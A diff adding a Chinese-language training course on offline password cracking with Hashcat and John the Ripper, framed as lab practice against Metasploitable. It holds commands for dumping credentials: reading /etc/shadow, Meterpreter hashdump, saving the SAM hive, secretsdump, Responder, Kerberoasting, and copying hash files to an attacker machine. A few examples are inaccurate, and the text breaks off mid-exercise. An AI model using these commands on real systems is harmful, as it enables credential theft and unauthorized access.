@@ -1,0 +1,1007 @@
+================================================================================
+  02-离线密码破解大师课 — Hashcat与John the Ripper
+  ArchStrike工具组：hashcat, john (John the Ripper)
+  预计学习时间：5-8小时  |  难度：中级到高级
+================================================================================
+
+【学习目标】
+1. 精通Hashcat的GPU加速破解，涵盖字典、规则、掩码、混合等攻击模式
+2. 掌握John the Ripper高级用法 (unshadow, 各种2john转换, 社区增强版)
+3. 学会提取各种格式的密码hash (Linux shadow, Windows SAM, 压缩包, Office)
+4. 理解不同hash类型的特性和最佳破解策略
+5. 完成从系统提取hash到成功破解的完整流程
+
+================================================================================
+  第一部分：Hashcat — GPU加速密码破解
+================================================================================
+
+1.1 Hashcat基础入门
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Hashcat是世界上最快、最先进的密码恢复工具，支持GPU加速。
+它支持5种主要攻击模式(Attack Mode)和超过300种hash类型。
+
+Step 1: 查看Hashcat帮助和版本信息：
+
+  hashcat --help
+  hashcat --version
+
+Step 2: 在Firefox中打开Hashcat官方Wiki：
+  https://hashcat.net/wiki/
+  浏览左侧导航菜单中的"Attack Modes"和"Hash Types"
+
+Step 3: 列出所有支持的hash类型（超过300种）：
+
+  hashcat --help | tail -200
+
+  这会列出所有-h参数对应的hash模式。常用的有：
+  ┌──────────────────────────────────────────────────────┐
+  │  0     │ MD5                                         │
+  │  100   │ SHA1                                        │
+  │  1400  │ SHA2-256                                    │
+  │  1700  │ SHA2-512                                    │
+  │  1000  │ NTLM (Windows NT hash)                      │
+  │  3000  │ LM (Windows LAN Manager hash)               │
+  │  1800  │ sha512crypt $6$, SHA512 (Unix)              │
+  │  3200  │ bcrypt $2*$, Blowfish (Unix)               │
+  │  500   │ md5crypt, MD5 (Unix), Cisco-IOS $1$         │
+  │  7400  │ sha256crypt $5$, SHA256 (Unix)              │
+  │  16800 │ WPA-PMKID-PBKDF2                            │
+  │  22000 │ WPA-PBKDF2-PMKID+EAPOL                       │
+  │  11600 │ 7-Zip                                       │
+  │  13600 │ WinZip                                      │
+  │  13000 │ RAR5                                        │
+  │  12500 │ RAR3-hp                                     │
+  │  13400 │ Keepass 1/2 AES                              │
+  │  10900 │ PBKDF2-HMAC-SHA256                          │
+  │  13721 │ VeraCrypt PBKDF2-HMAC-SHA512                 │
+  │  9400  │ MS Office 2007                              │
+  │  9500  │ MS Office 2010                              │
+  │  9600  │ MS Office 2013                              │
+  │  10500 │ PDF 1.4 - 1.6 (Acrobat 5 - 8)              │
+  └──────────────────────────────────────────────────────┘
+
+Step 4: 创建测试hash文件（用于学习各种模式）：
+
+  # MD5 hash of "password"
+  echo "5f4dcc3b5aa765d61d8327deb882cf99" > /tmp/md5_test.txt
+
+  # MD5 hash of "123456"
+  echo "e10adc3949ba59abbe56e057f20f883e" >> /tmp/md5_test.txt
+
+  # MD5 hash of "admin"
+  echo "21232f297a57a5a743894a0e4a801fc3" >> /tmp/md5_test.txt
+
+Step 5: 测试Hashcat的基本运行（-b参数进行基准测试）：
+
+  hashcat -b
+
+  这个命令会测试当前GPU/CPU的性能。
+  输出示例：
+  ┌──────────────────────────────────────────────────────┐
+  │ Hashmode: 0 - MD5                                    │
+  │ Speed.#1.........: 25000.0 MH/s (5000ms)             │
+  │ Hashmode: 1000 - NTLM                                │
+  │ Speed.#1.........: 35000.0 MH/s (5000ms)             │
+  └──────────────────────────────────────────────────────┘
+
+  注意：有GPU时NTLM可达数十亿次/秒，纯CPU可能只有数百万次/秒。
+
+1.2 攻击模式0：字典攻击 (Dictionary / Wordlist)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+字典攻击是最基础也是最常用的攻击模式，使用已有的密码表进行匹配。
+
+Step 6: MD5字典攻击：
+
+  hashcat -m 0 -a 0 /tmp/md5_test.txt /usr/share/wordlists/rockyou.txt
+
+  参数说明：
+  -m 0:       hash类型0 = MD5
+  -a 0:       攻击模式0 = 字典攻击 (Straight)
+  /tmp/md5_test.txt:  hash文件
+  rockyou.txt:        密码字典
+
+Step 7: 查看破解结果：
+
+  hashcat -m 0 -a 0 /tmp/md5_test.txt /usr/share/wordlists/rockyou.txt --show
+
+  --show: 显示已破解的hash
+
+Step 8: 输出结果到文件：
+
+  hashcat -m 0 -a 0 /tmp/md5_test.txt /usr/share/wordlists/rockyou.txt \
+    -o /tmp/cracked.txt
+
+Step 9: NTLM字典攻击（Windows密码hash）：
+
+  # 准备NTLM hash文件 (Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::)
+  echo "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::" > /tmp/ntlm_test.txt
+
+  hashcat -m 1000 -a 0 /tmp/ntlm_test.txt /usr/share/wordlists/rockyou.txt
+
+Step 10: 多字典组合使用：
+
+  hashcat -m 0 -a 0 /tmp/md5_test.txt \
+    /usr/share/wordlists/rockyou.txt \
+    /usr/share/wordlists/fasttrack.txt
+
+Step 11: 使用通配符加载多个字典：
+
+  hashcat -m 0 -a 0 /tmp/md5_test.txt /usr/share/wordlists/*.txt
+
+1.3 攻击模式0增强：规则攻击 (Rules)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+规则攻击是字典攻击的增强版，对字典中的每个单词应用变换规则。
+
+Step 12: 使用内置规则 (best64.rule)：
+
+  hashcat -m 1000 -a 0 /tmp/ntlm_test.txt /usr/share/wordlists/rockyou.txt \
+    -r /usr/share/hashcat/rules/best64.rule
+
+  规则文件位置（ArchStrike中）：
+  /usr/share/hashcat/rules/
+
+  best64.rule会对每个密码尝试64种常见变换：
+  - 首字母大写
+  - 末尾加数字 (password -> password1)
+  - 常见leet替换 (password -> p@ssw0rd)
+  - 全部大写
+  - 反转
+  - 等等
+
+Step 13: 使用Generate规则（生成更多变体）：
+
+  hashcat -m 1000 -a 0 /tmp/ntlm_test.txt /usr/share/wordlists/rockyou.txt \
+    -r /usr/share/hashcat/rules/d3ad0ne.rule
+
+Step 14: 使用多个规则文件组合：
+
+  hashcat -m 1000 -a 0 /tmp/ntlm_test.txt /usr/share/wordlists/rockyou.txt \
+    -r /usr/share/hashcat/rules/best64.rule \
+    -r /usr/share/hashcat/rules/toggles1.rule
+
+Step 15: 查看所有可用规则文件：
+
+  ls /usr/share/hashcat/rules/
+
+  常用规则文件说明：
+  - best64.rule       最适合新手，64条高效规则
+  - d3ad0ne.rule      大量的leet变换规则
+  - dive.rule         深入变换规则
+  - rockyou-30000.rule 从rockyou泄密中提取的规则
+  - T0XlC.rule        大小写变换规则
+  - toggles*.rule     切换大小写规则
+  - combinator.rule   组合规则
+
+Step 16: 创建自定义规则文件：
+
+  创建一个简单的规则文件 /tmp/my_rules.rule：
+  ┌──────────────────────────────────────────────────────┐
+  │ :                          # 原样尝试                │
+  │ $1 $2 $3                  # 末尾加 "123"            │
+  │ c                          # 首字母大写               │
+  │ u                          # 全部大写                 │
+  │ l                          # 全部小写                 │
+  │ c $1                       # 首字母大写+末尾加1      │
+  │ $!                         # 末尾加感叹号            │
+  │ sa@ so0 si1               # leet变换               │
+  └──────────────────────────────────────────────────────┘
+
+  使用：
+  hashcat -m 0 -a 0 /tmp/md5_test.txt /usr/share/wordlists/rockyou.txt \
+    -r /tmp/my_rules.rule
+
+Step 17: 规则语法速查：
+
+  ┌──────────────────────────────────────────────────────┐
+  │ :          什么都不做（保留原词）                    │
+  │ l          全部小写                                  │
+  │ u          全部大写                                  │
+  │ c          首字母大写                                │
+  │ C          首字母小写                                │
+  │ t          切换大小写                                │
+  │ TN         切换位置N的字符大小写                     │
+  │ r          反转整个单词                              │
+  │ d          复制单词                                  │
+  │ f          双重词 (word -> wordword)                 │
+  │ {          向左旋转                                  │
+  │ }          向右旋转                                  │
+  │ $X         末尾添加字符X                             │
+  │ ^X         开头添加字符X                             │
+  │ [          删除第一个字符                            │
+  │ ]          删除最后一个字符                          │
+  │ DN         删除位置N的字符                           │
+  │ sXY        替换字符X为Y                              │
+  │ @X         删除所有字符X                             │
+  │ iNX        在位置N插入字符X                          │
+  │ oNX        在位置N覆写字符X                          │
+  │ 'N         截断到长度N                                │
+  └──────────────────────────────────────────────────────┘
+
+1.4 攻击模式3：掩码攻击 (Mask / Brute-Force)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+掩码攻击允许你指定密码的格式，对每个位置进行暴力破解。
+
+Step 18: 基本掩码攻击（破解8位纯数字密码）：
+
+  hashcat -m 0 -a 3 /tmp/md5_test.txt ?d?d?d?d?d?d?d?d
+
+  参数说明：
+  -a 3:   攻击模式3 = 掩码攻击
+  ?d?d?d?d?d?d?d?d: 8位数字
+
+Step 19: 掩码字符集：
+
+  ┌──────────────────────────────────────────────────────┐
+  │ ?l  │ abcdefghijklmnopqrstuvwxyz    (小写字母)       │
+  │ ?u  │ ABCDEFGHIJKLMNOPQRSTUVWXYZ    (大写字母)       │
+  │ ?d  │ 0123456789                     (数字)           │
+  │ ?h  │ 0123456789abcdef               (十六进制小写)   │
+  │ ?H  │ 0123456789ABCDEF               (十六进制大写)   │
+  │ ?s  │ !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~  (特殊字符)  │
+  │ ?a  │ ?l?u?d?s                        (所有可打印)    │
+  │ ?b  │ 0x00 - 0xff                     (所有字节)      │
+  └──────────────────────────────────────────────────────┘
+
+Step 20: 组合掩码 — 破解模式为"大写+5位小写+2位数字"的密码：
+
+  hashcat -m 0 -a 3 /tmp/md5_test.txt ?u?l?l?l?l?l?d?d
+
+  例如可能的密码：Aabcde12, Zzzzzz99
+
+Step 21: 自定义字符集：
+
+  定义字符集1为"abc123"，字符集2为"!@#$"：
+  hashcat -m 0 -a 3 /tmp/md5_test.txt -1 abc123 -2 '!@#$' ?1?1?1?1?2
+
+  结果示例：abca!, 123b@, c123#
+
+Step 22: 递增掩码（尝试不同长度）：
+
+  hashcat -m 0 -a 3 /tmp/md5_test.txt --increment ?a?a?a?a?a?a?a?a
+
+  --increment: 从1个字符开始递增到8个字符
+
+Step 23: 设置最小和最大长度：
+
+  hashcat -m 0 -a 3 /tmp/md5_test.txt --increment-min 6 --increment-max 10 ?a?a?a?a?a?a?a?a?a?a
+
+Step 24: 使用mask文件（.hcmask）定义复杂的掩码组合：
+
+  创建 /tmp/my_masks.hcmask ：
+  ┌──────────────────────────────────────────────────────┐
+  │ ?u?l?l?l?l?l?d?d                                     │
+  │ ?u?l?l?l?l?l?l?d                                     │
+  │ ?u?l?l?l?l?l?l?s                                     │
+  │ ?u?l?l?l?l?d?d?d?d                                   │
+  │ ?l?l?l?l?l?l?d?d                                     │
+  └──────────────────────────────────────────────────────┘
+
+  使用：
+  hashcat -m 0 -a 3 /tmp/md5_test.txt /tmp/my_masks.hcmask
+
+1.5 攻击模式6：混合攻击 (字典+掩码)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+将字典中的每个单词与掩码组合。
+
+Step 25: 字典词 + 2位数字后缀（password -> password00-99）：
+
+  hashcat -m 0 -a 6 /tmp/md5_test.txt /usr/share/wordlists/rockyou.txt ?d?d
+
+  例如：password99, 12345600, admin42
+
+Step 26: 2位数字前缀 + 字典词：
+
+  hashcat -m 0 -a 7 /tmp/md5_test.txt ?d?d /usr/share/wordlists/rockyou.txt
+
+  例如：99password, 00123456, 42admin
+
+Step 27: 1个特殊字符后缀 + 字典词 + 1位数字：
+
+  # 需要结合规则和掩码
+  hashcat -m 0 -a 0 /tmp/md5_test.txt /usr/share/wordlists/rockyou.txt \
+    -r /usr/share/hashcat/rules/best64.rule
+
+1.6 攻击模式1：组合攻击 (Combinator)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+将两个字典中的所有单词两两组合。
+
+Step 28: 组合两个字典（word1 + word2）：
+
+  hashcat -m 0 -a 1 /tmp/md5_test.txt /usr/share/wordlists/rockyou.txt \
+    /usr/share/wordlists/fasttrack.txt
+
+  例如：passwordadmin, 123456password, iloveyou123
+
+Step 29: 使用-j和-k参数添加中间字符：
+
+  hashcat -m 0 -a 1 /tmp/md5_test.txt /usr/share/wordlists/rockyou.txt \
+    /usr/share/wordlists/rockyou.txt -j '$-' -k '$!'
+
+  结果示例：password-admin!, 123456-password!
+
+1.7 高级选项与技巧
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 30: 使用--session保存和恢复会话：
+
+  hashcat -m 1000 -a 0 --session ntlm_crack \
+    /tmp/ntlm_test.txt /usr/share/wordlists/rockyou.txt
+
+  中断后恢复：
+  hashcat --session ntlm_crack --restore
+
+Step 31: 指定设备（多GPU时选择使用哪个）：
+
+  hashcat -m 0 -a 0 -d 1 /tmp/md5_test.txt /usr/share/wordlists/rockyou.txt
+
+  -d 1: 使用设备ID为1的GPU
+
+Step 32: 显示破解进度和预估时间：
+
+  hashcat -m 0 -a 3 /tmp/md5_test.txt ?a?a?a?a?a?a?a?a --status --status-timer 10
+
+  --status:        启用状态显示
+  --status-timer:  每10秒更新一次状态
+
+  运行中按 s 键查看详细状态。
+
+Step 33: 运行时交互快捷键：
+
+  在Hashcat运行时按：
+  s:  显示状态 (status)
+  p:  暂停 (pause)
+  r:  恢复 (resume)
+  b:  跳过当前任务 (bypass)
+  q:  退出并保存 (quit)
+  c:  退出并保存检查点 (checkpoint)
+
+Step 34: 使用--force强制运行（忽略某些警告）：
+
+  hashcat -m 0 -a 0 --force /tmp/md5_test.txt /tmp/small_dict.txt
+
+Step 35: 破解Linux sha512crypt hash ($6$)：
+
+  # 创建测试hash
+  echo "testuser:\$6\$somesalt\$hashedpasswordvalue" > /tmp/unix_hash.txt
+
+  hashcat -m 1800 -a 0 /tmp/unix_hash.txt /usr/share/wordlists/rockyou.txt
+
+Step 36: 破解bcrypt hash ($2a$ / $2b$ / $2y$)：
+
+  echo "admin:\$2a\$10\$SALTANDHASHVALUEHERE" > /tmp/bcrypt_hash.txt
+
+  hashcat -m 3200 -a 0 /tmp/bcrypt_hash.txt /usr/share/wordlists/rockyou.txt
+
+  注意：bcrypt计算量极大，速度会比MD5慢1000-10000倍。
+
+Step 37: 破解WPA/WPA2握手包：
+
+  # 需要先用hcxtools或aircrack-ng捕获握手包
+  # 旧版cap格式使用hcxpcapngtool转换
+  hcxpcapngtool capture.cap -o hash.hc22000
+
+  # 破解
+  hashcat -m 22000 -a 3 hash.hc22000 ?d?d?d?d?d?d?d?d
+
+================================================================================
+  第二部分：John the Ripper — 高级密码破解
+================================================================================
+
+2.1 John基础入门
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+John the Ripper (JtR) 是另一款经典的密码破解工具，特别擅长：
+- Unix/Linux密码文件处理
+- 各种"2john"格式转换
+- 自动hash识别
+- 社区增强版(Jumbo)的丰富功能
+
+Step 1: 查看John版本和帮助：
+
+  john --help
+  john --version
+
+Step 2: 列出所有支持的hash格式：
+
+  john --list=formats | head -50
+
+  示例输出会包括：
+  - Raw-MD5, Raw-SHA1, Raw-SHA256, Raw-SHA512
+  - NT, LM
+  - bcrypt, sha512crypt, sha256crypt, md5crypt
+  - WPA-PSK, RAR5, ZIP, 7z
+  - PDF, Office
+  - KeePass, LastPass
+  - 以及数百种
+
+Step 3: 列出所有支持的编码格式：
+
+  john --list=formats | wc -l   # 查看数量
+
+2.2 Linux系统密码破解
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 4: 使用unshadow合并passwd和shadow文件：
+
+  unshadow /etc/passwd /etc/shadow > /tmp/unshadowed.txt
+
+  合并后的格式：
+  root:$6$salt$hash:0:0:root:/root:/bin/bash
+  user:$6$salt$hash:1000:1000:user:/home/user:/bin/bash
+
+Step 5: 使用John破解合并后的hash：
+
+  john /tmp/unshadowed.txt
+
+  # John会自动识别hash类型并选择合适的破解方法
+
+Step 6: 指定字典进行破解：
+
+  john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/unshadowed.txt
+
+Step 7: 查看已破解的密码：
+
+  john --show /tmp/unshadowed.txt
+
+  输出示例：
+  root:password123:0:0:root:/root:/bin/bash
+  user:letmein:1000:1000:user:/home/user:/bin/bash
+
+  1 password hash cracked, 1 left
+
+Step 8: 查看破解进度：
+
+  john --status
+
+Step 9: 恢复中断的会话：
+
+  john --restore
+
+  # 或从特定的session恢复
+  john --restore=session_name
+
+Step 10: 创建命名的会话（便于管理和恢复）：
+
+  john --session=crack1 /tmp/unshadowed.txt
+
+2.3 各种"2john"转换工具
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+John社区增强版提供了大量的格式转换工具，将各种加密文件转换为
+John可以破解的hash格式。
+
+Step 11: ZIP文件密码提取：
+
+  zip2john secret.zip > /tmp/zip_hash.txt
+  john /tmp/zip_hash.txt
+
+Step 12: RAR文件密码提取：
+
+  rar2john secret.rar > /tmp/rar_hash.txt
+  john /tmp/rar_hash.txt
+
+Step 13: 7-Zip文件密码提取：
+
+  7z2john secret.7z > /tmp/7z_hash.txt
+  john /tmp/7z_hash.txt
+
+Step 14: PDF文件密码提取：
+
+  pdf2john document.pdf > /tmp/pdf_hash.txt
+  john /tmp/pdf_hash.txt
+
+Step 15: Microsoft Office文件密码提取：
+
+  # Office 2007-2016
+  office2john document.docx > /tmp/office_hash.txt
+  john /tmp/office_hash.txt
+
+Step 16: WPA/WPA2握手包提取：
+
+  # 首先用aircrack-ng捕获握手包
+  # 然后用hccap2john (旧格式) 或 hcxpcapngtool (新格式)
+
+  # 方法A: 使用aircrack-ng套件的wpaclean/wpa2john
+  wpaclean /tmp/clean.cap capture.cap
+  # 然后用hashcat方式
+
+  # 方法B: 如果已经有.hccapx文件
+  hccap2john capture.hccapx > /tmp/wpa_hash.txt
+  john /tmp/wpa_hash.txt
+
+Step 17: Keepass数据库密码提取：
+
+  keepass2john database.kdbx > /tmp/keepass_hash.txt
+  john /tmp/keepass_hash.txt
+
+Step 18: SSH私钥密码破解：
+
+  # 提取为hash格式
+  ssh2john id_rsa > /tmp/ssh_hash.txt
+  john /tmp/ssh_hash.txt
+
+Step 19: PFX/P12证书密码破解：
+
+  pfx2john cert.pfx > /tmp/pfx_hash.txt
+  john /tmp/pfx_hash.txt
+
+2.4 规则模式
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+John同样支持规则，语法与Hashcat类似但略有不同。
+
+Step 20: 使用内置规则：
+
+  john --wordlist=/usr/share/wordlists/rockyou.txt \
+    --rules=Single /tmp/unshadowed.txt
+
+Step 21: 查看所有可用规则：
+
+  ls /usr/share/john/rules/    # 或 /etc/john/
+
+Step 22: 常见John规则文件：
+
+  john --wordlist=/usr/share/wordlists/rockyou.txt \
+    --rules=Wordlist /tmp/unshadowed.txt
+
+  john --wordlist=/usr/share/wordlists/rockyou.txt \
+    --rules=Jumbo /tmp/unshadowed.txt
+
+2.5 增量模式 (Incremental Mode)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+John的增量模式类似于Hashcat的掩码攻击，但更智能化。
+
+Step 23: 使用增量模式：
+
+  john --incremental /tmp/unshadowed.txt
+
+  John会从最常见的字符模式开始尝试。
+
+Step 24: 指定字符集的增量模式：
+
+  john --incremental=Digits /tmp/unshadowed.txt       # 仅数字
+  john --incremental=Lower /tmp/unshadowed.txt        # 仅小写字母
+  john --incremental=Alpha /tmp/unshadowed.txt        # 字母
+  john --incremental=Alnum /tmp/unshadowed.txt        # 字母+数字
+  john --incremental=LanMan /tmp/unshadowed.txt       # LM hash专用
+
+Step 25: 设置增量模式长度限制：
+
+  john --incremental=Digits --min-length=6 --max-length=10 /tmp/unshadowed.txt
+
+2.6 外部分裂模式 (External Mode)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+John支持用户编写自定义密码生成逻辑。
+
+Step 26: 编写简单的外部模式（生成数字序列）：
+
+  创建john本地配置文件 ~/.john/john.conf 或 /etc/john/john.conf，
+  添加：
+  ┌──────────────────────────────────────────────────────┐
+  │ [List.External:NumberSequence]                       │
+  │ void filter() {                                      │
+  │     int i;                                           │
+  │     i = 0;                                           │
+  │     while (i < 10000) {                              │
+  │         word = i;                                    │
+  │         i++;                                         │
+  │     }                                                │
+  │ }                                                    │
+  └──────────────────────────────────────────────────────┘
+
+  使用：
+  john --external=NumberSequence /tmp/hash.txt
+
+2.7 高级选项
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 27: 多核并行破解（-fork）：
+
+  john --wordlist=/usr/share/wordlists/rockyou.txt --fork=4 /tmp/unshadowed.txt
+
+  --fork=4: 使用4个进程并行（根据CPU核心数调整）
+
+Step 28: 限制资源使用：
+
+  john --wordlist=/usr/share/wordlists/rockyou.txt \
+    --max-run-time=3600 /tmp/unshadowed.txt
+
+  --max-run-time=3600: 最长运行3600秒（1小时）
+
+Step 29: 使用多字典和管道：
+
+  john --wordlist=/usr/share/wordlists/rockyou.txt \
+    --stdout | john --pipe /tmp/unshadowed.txt
+
+Step 30: 查看详细的破解日志：
+
+  john --show=left /tmp/unshadowed.txt    # 显示尚未破解的
+  john --show=types /tmp/unshadowed.txt   # 显示hash类型分布
+
+================================================================================
+  第三部分：Hash提取实战技术
+================================================================================
+
+3.1 从Linux系统提取密码hash
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 1: 在获得root权限的Linux目标机上提取：
+
+  # 方法1: 直接读取shadow
+  cat /etc/shadow
+
+  # 方法2: 使用unshadow（需要root或sudo）
+  sudo unshadow /etc/passwd /etc/shadow > /tmp/linux_hashes.txt
+
+  # 方法3: 通过Meterpreter提取（在Windows攻击机上用MSF）
+  meterpreter > hashdump
+  meterpreter > run post/linux/gather/hashdump
+
+Step 2: 将提取的hash传输回攻击机：
+
+  scp target:/tmp/linux_hashes.txt ./
+
+Step 3: 开始破解：
+
+  hashcat -m 1800 -a 0 linux_hashes.txt /usr/share/wordlists/rockyou.txt
+
+  # 或使用John
+  john linux_hashes.txt
+
+3.2 从Windows系统提取密码hash
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 4: 通过Meterpreter提取Windows hash：
+
+  meterpreter > hashdump
+  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+  NT hash是第三个冒号后面的部分（32个十六进制字符）。
+
+Step 5: 用reg.exe手动导出（需要管理员权限）：
+
+  reg save HKLM\SAM C:\temp\sam.save
+  reg save HKLM\SYSTEM C:\temp\system.save
+  reg save HKLM\SECURITY C:\temp\security.save
+
+Step 6: 使用secretsdump.py从注册表文件中提取hash：
+
+  secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
+
+Step 7: 使用NTLM hash破解：
+
+  hashcat -m 1000 -a 0 windows_ntlm.txt /usr/share/wordlists/rockyou.txt
+
+3.3 从网络流量提取hash
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 8: 通过Responder捕获NetNTLMv2 hash：
+
+  sudo responder -I eth0
+
+Step 9: 使用hashcat破解NetNTLMv2：
+
+  hashcat -m 5600 -a 0 netntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt
+
+3.4 从Kerberos票据提取hash
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 10: Kerberoasting攻击（需要域用户身份）：
+
+  # 使用Impacket
+  GetUserSPNs.py DOMAIN/user:password -dc-ip 192.168.56.10 -request
+
+Step 11: 破解TGS-REP hash：
+
+  hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
+
+================================================================================
+  第四部分：Hashcat与John的协同使用
+================================================================================
+
+4.1 使用John生成候选密码供Hashcat使用
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+John有强大的密码生成管道功能，可以将生成的密码流
+传递给Hashcat进行GPU加速测试。
+
+Step 1: John生成候选密码，Hashcat破解：
+
+  john --wordlist=/usr/share/wordlists/rockyou.txt --rules=Jumbo --stdout \
+    | hashcat -m 0 -a 0 /tmp/md5_test.txt
+
+Step 2: 排除已知的密码（只尝试还没试过的）：
+
+  john --wordlist=/usr/share/wordlists/rockyou.txt --rules=Jumbo --stdout \
+    | hashcat -m 0 -a 0 --stdin /tmp/md5_test.txt
+
+4.2 使用Hashcat的potfile排除已破解的
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Step 3: Hashcat的potfile路径通常在：
+
+  ~/.hashcat/hashcat.potfile
+
+Step 4: 使用--show查看已破解的：
+
+  hashcat -m 0 /tmp/md5_test.txt --show
+
+Step 5: 结合John和Hashcat结果：
+
+  # 先用Hashcat快速破解简单hash
+  hashcat -m 0 -a 0 /tmp/md5_test.txt /usr/share/wordlists/rockyou.txt
+
+  # 再用John规则攻击余下的
+  hashcat -m 0 -a 0 --left /tmp/md5_test.txt \
+    --stdout | john --pipe /tmp/leftover_hashes.txt
+
+4.3 针对特定hash类型的最优策略
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+不同hash类型的破解速度差异极大，需要选择不同的策略：
+
+┌──────────────────────────────────────────────────────────────────┐
+│ Hash类型        │ 速度     │ 推荐策略                            │
+├─────────────────┼──────────┼─────────────────────────────────────┤
+│ NTLM            │ 极快     │ 先字典+规则，再掩码                 │
+│ MD5             │ 极快     │ 先字典+规则，再掩码                 │
+│ SHA1/SHA256     │ 很快     │ 先字典，再掩码                      │
+│ NetNTLMv1       │ 很快     │ 字典+规则（因为常有复杂度需求）    │
+│ NetNTLMv2       │ 中等     │ 字典+规则，合理掩码                 │
+│ WPA/WPA2        │ 较慢     │ 高质量字典，掩码有限长度            │
+│ sha512crypt     │ 慢       │ 针对性字典，仔细选择规则            │
+│ bcrypt          │ 很慢     │ 小字典，高价值单词优先              │
+│ RAR5            │ 极慢     │ 极小字典，仅尝试最可能的密码        │
+│ VeraCrypt       │ 极慢     │ 仅少数可能密码，确认已知信息        │
+└──────────────────────────────────────────────────────────────────┘
+
+Step 6: 快速hash (NTLM/MD5) 的破解策略：
+
+  # 第一轮: 大字典 + 快速规则
+  hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r best64.rule
+
+  # 第二轮: 组合攻击
+  hashcat -m 1000 -a 1 hashes.txt rockyou.txt rockyou.txt
+
+  # 第三轮: 掩码8位字母+数字
+  hashcat -m 1000 -a 3 hashes.txt -1 ?l?d ?1?1?1?1?1?1?1?1
+
+Step 7: 慢速hash (bcrypt/sha512crypt) 的破解策略：
+
+  # 第一轮: 极小针对性字典（从目标信息构建）
+  hashcat -m 3200 -a 0 bcrypt_hashes.txt /tmp/targeted_list.txt
+
+  # 第二轮: 常见密码 + 有限规则
+  hashcat -m 3200 -a 0 bcrypt_hashes.txt /tmp/top100.txt -r best64.rule
+
+  # 注：对于慢速hash，每个目标通常最多尝试百万级别密码
+
+================================================================================
+  第五部分：综合实战练习
+================================================================================
+
+【实验环境】
+- 攻击机: ArchStrike Linux (192.168.56.1)
+- 目标机: Linux (192.168.56.101) — Metasploitable 2/3
+- 练习目的: 从渗透到hash提取再到密码破解的完整流程
+
+⚠️ 警告：仅在授权的实验环境中练习！
+
+【练习1：从Linux目标提取并破解密码】
+
+Step 1: 先通过漏洞利用获得目标机的shell权限：
+
+  # 假设已通过某个exploit获得了shell
+  ssh msfadmin@192.168.56.101
+  # 密码: msfadmin（Metasploitable默认密码）
+
+Step 2: 在目标机上查看用户信息：
+
+  cat /etc/passwd
+  sudo cat /etc/shadow     # 如果有sudo权限
+  ls -la /home/
+
+Step 3: 将shadow文件复制到可访问位置：
+
+  # 在目标机上
+  cp /etc/shadow /tmp/shadow.txt
+  chmod 644 /tmp/shadow.txt
+
+Step 4: 从攻击机下载shadow文件：
+
+  scp msfadmin@192.168.56.101:/tmp/shadow.txt ./
+
+Step 5: 在攻击机上查看shadow文件内容：
+
+  cat shadow.txt
+
+  识别hash类型：
+  - $1$ 开头 = MD5 (hashcat -m 500)
+  - $5$ 开头 = SHA256 (hashcat -m 7400)
+  - $6$ 开头 = SHA512 (hashcat -m 1800)
+  - $2a$ 或 $2y$ 开头 = bcrypt (hashcat -m 3200)
+
+Step 6: 提取各个用户的hash行：
+
+  grep '^\$' shadow.txt > /tmp/hashes_only.txt
+  # 或
+  cat shadow.txt | cut -d: -f1,2 > /tmp/user_hash.txt
+
+Step 7: 使用Hashcat破解：
+
+  # 先确认hash类型
+  head -1 shadow.txt
+
+  # 如果是$6$ (SHA512)
+  hashcat -m 1800 -a 0 -o /tmp/cracked_shadow.txt \
+    shadow.txt /usr/share/wordlists/rockyou.txt
+
+Step 8: 查看破解结果：
+
+  hashcat -m 1800 shadow.txt --show
+
+  # 或用cat
+  cat /tmp/cracked_shadow.txt
+
+Step 9: 对未破解的hash使用规则攻击：
+
+  hashcat -m 1800 -a 0 --force \
+    shadow.txt /usr/share/wordlists/rockyou.txt \
+    -r /usr/share/hashcat/rules/best64.rule
+
+【练习2：Windows hash提取与破解】
+
+Step 10: 假设通过Metasploit获得了Windows目标的Meterpreter会话：
+
+  meterpreter > getsystem
+  meterpreter > hashdump
+
+Step 11: 将输出保存为hash文件 /tmp/windows_hashes.txt：
+
+  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+  UserA:1001:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+
+Step 12: 准备NTLM hash破解（只取NT部分，即第4个冒号后的32字符）：
+
